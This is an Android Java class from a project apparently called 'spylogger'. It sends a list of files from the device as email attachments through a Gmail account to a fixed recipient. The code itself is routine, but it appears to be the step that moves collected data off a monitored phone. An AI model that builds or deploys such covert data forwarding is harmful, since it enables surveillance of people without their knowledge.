package com.gravatasufoca.spylogger.utils;

import android.os.AsyncTask;
import android.util.Log;

import com.gmailsender.GMailSender;
import com.gravatasufoca.spylogger.R;

import java.io.File;
import java.util.List;

import javax.mail.AuthenticationFailedException;
import javax.mail.MessagingException;

public class SendEmailAsyncTask extends AsyncTask<List<String> , Void, Boolean> {
	private String assunto, destinatario;
	private GMailSender gmail;
	private boolean media;
	public SendEmailAsyncTask(GMailSender gmail, String assunto,String destinatario,boolean media) {
		this.gmail=gmail;
		this.assunto=assunto;
		this.destinatario=destinatario;
		this.media=media;
	}

	protected Boolean doInBackground(List<String>... anexos) {
		try {
			List<String> arquivos=anexos[0];

			boolean parts=arquivos.size()>1;
			int i=1;
			int total=arquivos.size();

			for(String arquivo: arquivos){

				String subject=assunto;

				if(parts || media){
					if(total>1){
						subject+=" - "+i+"/"+total;
						i++;
					}

				}
				File f=new File(arquivo);
				gmail.addAttachment(f.getName(), f );
				gmail.sendMail(subject, gmail.getContext().getString(R.string.mail_message), null, destinatario);

				gmail.clearAttachments();
			}


			return true;
		} catch (AuthenticationFailedException e) {
			Log.e(SendEmailAsyncTask.class.getName(), "Bad account details");
			e.printStackTrace();
			return false;
		} catch (MessagingException e) {
			e.printStackTrace();
			return false;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}

}